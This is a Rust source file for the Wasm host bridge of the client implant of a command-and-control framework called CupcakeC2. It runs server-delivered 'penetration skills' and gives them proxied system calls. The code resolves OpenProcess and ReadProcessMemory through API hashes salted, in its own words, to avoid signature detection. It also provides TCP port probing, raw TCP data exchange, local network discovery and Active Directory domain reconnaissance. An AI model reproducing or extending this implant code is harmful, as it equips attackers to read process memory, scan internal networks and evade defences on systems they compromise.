// Client/src/wasm_host.rs
// CupcakeC2 v3.0.1 - Wasm Host Bridge
// 用于运行服务端下发的 Wasm Skills，并提供系统调用代理。

use wasmi::{Caller, Engine, Linker, Module, Store};
use crate::types::CommandResult;
#[allow(unused_imports)]
use crate::stealth;
use log::{info, error, debug};

/// API 哈希映射表 (与服务端和 Wasm Skill 保持一致)
const HASH_READ_PROCESS_MEMORY: u32 = 0x54C6A9B2;
const HASH_OPEN_PROCESS: u32 = 0x21B3FD10;
const HASH_TCP_CONNECT: u32 = 0xA1B2C3D4; // New Network Capability
const HASH_GET_NET_INFO: u32 = 0xC0FFEE10; // New: Get Local Network Info
const HASH_GET_ARGS: u32 = 0x11223344;     // New: Get JSON Arguments
const HASH_TCP_SEND_RECV: u32 = 0x55667788; // New: TCP Data Exchange
const HASH_GET_DOMAIN_INFO: u32 = 0xADADADAD; // New: AD Reconnaissance

// API Hashes for Kernel32 (Salted to avoid signature detection)
#[cfg(target_os = "windows")]
const HASH_FN_OPEN_PROCESS: u32 = 0x2E1D7B43; 
#[cfg(target_os = "windows")]
const HASH_FN_READ_PROCESS_MEMORY: u32 = 0x4F0B22C9;

#[repr(C, packed)]
#[cfg(target_os = "windows")]
struct ReadProcessParams {
    h_process: u64,
    base_address: u64,
    buffer_ptr: u32,
    size: u32,
    bytes_read: u32,
}

#[repr(C, packed)]
#[cfg(target_os = "windows")]
struct OpenProcessParams {
    dw_desired_access: u32,
    b_inherit_handle: u32,
    dw_process_id: u32,
}

#[repr(C, packed)]
struct TcpConnectParams {
    target_ip: u32,  // Big-endian IPv4
    port: u16,
    timeout_ms: u32,
}

#[repr(C, packed)]
struct GetNetInfoParams {
    buffer_ptr: u32,
    buffer_size: u32,
}

#[repr(C, packed)]
struct TcpSendRecvParams {
    target_ip: u32,
    port: u16,
    timeout_ms: u32,
    send_ptr: u32,
    send_len: u32,
    recv_ptr: u32,
    recv_len: u32,
}



struct WasmState {
    logs: String,
    args: String,
}

/// 执行 Wasm 格式的渗透技能 (Skill)
pub async fn execute_wasm_skill(wasm_bytes: &[u8], args: serde_json::Value) -> CommandResult {
    info!("[*] Initializing Wasm runtime for skill execution...");
    
    let engine = Engine::default();
    let module = match Module::new(&engine, wasm_bytes) {
        Ok(m) => m,
        Err(e) => return CommandResult::error(format!("Failed to load Wasm module: {}", e)),
    };

    let mut store = Store::new(&engine, WasmState {
        logs: String::new(),
        args: args.to_string(),
    });
    let mut linker = Linker::new(&engine);

    // --- 注册 Host 系统调用网关 ---
    linker.func_wrap("env", "host_call", |mut caller: Caller<'_, WasmState>, api_hash: u32, params_ptr: u32| -> u64 {
        debug!("Wasm requested host_call for API hash: 0x{:08X}", api_hash);
        
        match api_hash {
            HASH_OPEN_PROCESS => {
                #[cfg(target_os = "windows")]
                {
                    let params: &OpenProcessParams = unsafe { read_wasm_struct(&caller, params_ptr) };
                    unsafe {
                        let module = stealth::get_module_base(0x6A4ABC5B); // kernel32.dll
                        if let Some(addr) = stealth::get_api_addr(module, HASH_FN_OPEN_PROCESS) {
                            let func: unsafe extern "system" fn(u32, i32, u32) -> *mut winapi::ctypes::c_void = std::mem::transmute(addr);
                            func(params.dw_desired_access, params.b_inherit_handle as i32, params.dw_process_id) as u64
                        } else { 0 }
                    }
                }
                #[cfg(not(target_os = "windows"))]
                { 0 }
            },
            HASH_READ_PROCESS_MEMORY => {
                #[cfg(target_os = "windows")]
                {
                    let params: &ReadProcessParams = unsafe { read_wasm_struct(&caller, params_ptr) };
                    let mut bytes_read: usize = 0;
                    let target_buffer = get_wasm_memory_ptr(&mut caller, params.buffer_ptr);
                    
                    unsafe {
                        let module = stealth::get_module_base(0x6A4ABC5B); // kernel32.dll
                        if let Some(addr) = stealth::get_api_addr(module, HASH_FN_READ_PROCESS_MEMORY) {
                            let func: unsafe extern "system" fn(*mut winapi::ctypes::c_void, *const winapi::ctypes::c_void, *mut winapi::ctypes::c_void, usize, *mut usize) -> i32 = std::mem::transmute(addr);
                            let res = func(
                                params.h_process as *mut winapi::ctypes::c_void,
                                params.base_address as *const winapi::ctypes::c_void,
                                target_buffer as *mut winapi::ctypes::c_void,
                                params.size as usize,
                                &mut bytes_read
                            );
                            if res != 0 { 1 } else { 0 }
                        } else { 0 }
                    }
                }
                #[cfg(not(target_os = "windows"))]
                { 0 }
            },
            HASH_TCP_CONNECT => {
                let params: &TcpConnectParams = unsafe { read_wasm_struct(&caller, params_ptr) };
                // Convert Big-endian u32 IP to standard format
                let ip_bytes = params.target_ip.to_be_bytes();
                let addr = std::net::SocketAddr::from((ip_bytes, params.port));
                
                debug!("Wasm Network Scan: Connecting to {}", addr);
                match std::net::TcpStream::connect_timeout(&addr, std::time::Duration::from_millis(params.timeout_ms as u64)) {
                    Ok(_) => 1,
                    Err(_) => 0,
                }
            },
            HASH_GET_NET_INFO => {
                let params: &GetNetInfoParams = unsafe { read_wasm_struct(&caller, params_ptr) };
                let target_buffer = get_wasm_memory_ptr(&mut caller, params.buffer_ptr);
                
                // Use the UDP hack to get the primary local IP at least
                // This is cross-platform and reliable.
                let mut ip_list = String::new();
                if let Ok(socket) = std::net::UdpSocket::bind("0.0.0.0:0") {
                    if socket.connect("8.8.8.8:80").is_ok() {
                        if let Ok(local_addr) = socket.local_addr() {
                            ip_list.push_str(&local_addr.ip().to_string());
                        }
                    }
                }
                
                // If we are on windows, we can try to get more via environment or registry if needed
                // But for now, one is enough to start "Spy Mode"
                
                let bytes = ip_list.as_bytes();
                let len = bytes.len().min(params.buffer_size as usize);
                unsafe {
                    std::ptr::copy_nonoverlapping(bytes.as_ptr(), target_buffer as *mut u8, len);
                }
                len as u64
            },
            HASH_GET_ARGS => {
                let params: &GetNetInfoParams = unsafe { read_wasm_struct(&caller, params_ptr) };
                let target_buffer = get_wasm_memory_ptr(&mut caller, params.buffer_ptr);
                
                let args_str = &caller.data().args;
                let bytes = args_str.as_bytes();
                let len = bytes.len().min(params.buffer_size as usize);
                unsafe {
                    std::ptr::copy_nonoverlapping(bytes.as_ptr(), target_buffer as *mut u8, len);
                }
                len as u64
            },
            HASH_GET_DOMAIN_INFO => {
                let params: &GetNetInfoParams = unsafe { read_wasm_struct(&caller, params_ptr) };
                let target_buffer = get_wasm_memory_ptr(&mut caller, params.buffer_ptr);
                
                // --- 域环境信息收集逻辑 ---
                #[allow(unused_mut)]
                let mut info = String::new();
                #[cfg(not(target_os = "windows"))]
                {
                    // remove unused mut warning in linux
                    let _ = &info; 
                }
                #[cfg(target_os = "windows")]
                {
                    use winapi::um::lmjoin::{NetGetJoinInformation, NetSetupDomainName, NETSETUP_JOIN_STATUS};
                    use winapi::um::lmapibuf::NetApiBufferFree;
                    use widestring::U16CStr;
                    
                    let mut domain_name_ptr: *mut u16 = std::ptr::null_mut();
                    let mut join_status: NETSETUP_JOIN_STATUS = 0;
                    
                    unsafe {
                        if NetGetJoinInformation(std::ptr::null(), &mut domain_name_ptr as *mut *mut u16, &mut join_status) == 0 {
                            if join_status == NetSetupDomainName {
                                // Proper way to convert PWSTR to Rust String using latest widestring crate
                                let domain = U16CStr::from_ptr_str(domain_name_ptr).to_string_lossy();
                                info.push_str("Domain:"); info.push_str(&domain); info.push_str("\n");
                                
                                // 获取环境变量中的域控等信息
                                if let Ok(dc) = std::env::var("LOGONSERVER") {
                                    info.push_str("LogonServer:"); info.push_str(&dc); info.push_str("\n");
                                }
                                if let Ok(dns) = std::env::var("USERDNSDOMAIN") {
                                    info.push_str("DNS:"); info.push_str(&dns); info.push_str("\n");
                                }
                            } else {
                                info.push_str("Status:Workgroup\n");
                            }
                            if !domain_name_ptr.is_null() {
                                NetApiBufferFree(domain_name_ptr as *mut _);
                            }
                        }
                    }
                }
                
                let bytes = info.as_bytes();
                let len = bytes.len().min(params.buffer_size as usize);
                unsafe {
                    std::ptr::copy_nonoverlapping(bytes.as_ptr(), target_buffer as *mut u8, len);
                }
                len as u64
            },
            HASH_TCP_SEND_RECV => {
                let params: &TcpSendRecvParams = unsafe { read_wasm_struct(&caller, params_ptr) };
                let ip_bytes = params.target_ip.to_be_bytes();
                let addr = std::net::SocketAddr::from((ip_bytes, params.port));
                let timeout = std::time::Duration::from_millis(params.timeout_ms as u64);
                
                match std::net::TcpStream::connect_timeout(&addr, timeout) {
                    Ok(mut stream) => {
                        use std::io::{Read, Write};
                        let _ = stream.set_read_timeout(Some(timeout));
                        let _ = stream.set_write_timeout(Some(timeout));
                        
                        if params.send_len > 0 {
                            let send_buf = get_wasm_memory_ptr(&mut caller, params.send_ptr) as *const u8;
                            let send_slice = unsafe { std::slice::from_raw_parts(send_buf, params.send_len as usize) };
                            if stream.write_all(send_slice).is_err() { return 0; }
                        }
                        
                        if params.recv_len > 0 {
                            let recv_buf = get_wasm_memory_ptr(&mut caller, params.recv_ptr) as *mut u8;
                            let recv_slice = unsafe { std::slice::from_raw_parts_mut(recv_buf, params.recv_len as usize) };
                            match stream.read(recv_slice) {
                                Ok(n) => n as u64,
                                Err(_) => 0,
                            }
                        } else {
                            1 // Success but no read requested
                        }
                    },
                    Err(_) => 0,
                }
            },
            _ => {
                error!("Unknown API hash requested by Wasm: 0x{:08X}", api_hash);
                0
            }
        }
    }).expect("Failed to define host_call");

    linker.func_wrap("env", "host_report_result", |mut caller: Caller<'_, WasmState>, ptr: u32, len: u32| {
        let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
        let data = memory.data(&caller);
        let result = &data[ptr as usize..(ptr + len) as usize];
        let log_msg = String::from_utf8_lossy(result).to_string();
        info!("[+] Wasm Skill Result: {}", log_msg);
        
        // Append to the store's data string
        let current_state = caller.data_mut();
        current_state.logs.push_str(&log_msg);
        current_state.logs.push('\n');
    }).expect("Failed to define host_report_result");

    // 实例化与调用 (必须调用 .start() 才能获得 Instance)
    let instance = match linker.instantiate(&mut store, &module) {
        Ok(i) => i.start(&mut store).expect("Failed to start Wasm instance"),
        Err(e) => return CommandResult::error(format!("Linker instantiation failed: {}", e)),
    };

    let run_fn = match instance.get_typed_func::<u32, ()>(&store, "run_skill") {
        Ok(f) => f,
        Err(e) => return CommandResult::error(format!("Could not find 'run_skill' export: {}", e)),
    };

    // 解析参数 (例如 PID)
    let pid = args["pid"].as_u64().unwrap_or(0) as u32;

    match run_fn.call(&mut store, pid) {
        Ok(_) => {
            let final_output = store.data().logs.clone();
            CommandResult::success(final_output)
        },
        Err(e) => CommandResult::error(format!("Skill execution error: {}\nLog: {}", e, store.data().logs)),
    }
}

/// 辅助：从 Wasm 内存中读取 C 结构体镜像
unsafe fn read_wasm_struct<'a, T, S>(caller: &Caller<'_, S>, ptr: u32) -> &'a T {
    let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
    let data = memory.data(caller);
    let raw_ptr = data.as_ptr().add(ptr as usize) as *const T;
    &*raw_ptr
}

/// 辅助：获取 Wasm 的可变内存指针用于 API 直接写入 (零拷贝)
fn get_wasm_memory_ptr<S>(caller: &mut Caller<'_, S>, wasm_ptr: u32) -> *mut u8 {
    let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
    let data = memory.data_mut(caller);
    unsafe { data.as_mut_ptr().add(wasm_ptr as usize) }
}

impl CommandResult {
    fn success(msg: String) -> Self {
        Self { stdout: msg, stderr: String::new(), path: None, req_id: None }
    }
    fn error(msg: String) -> Self {
        Self { stdout: String::new(), stderr: msg, path: None, req_id: None }
    }
}
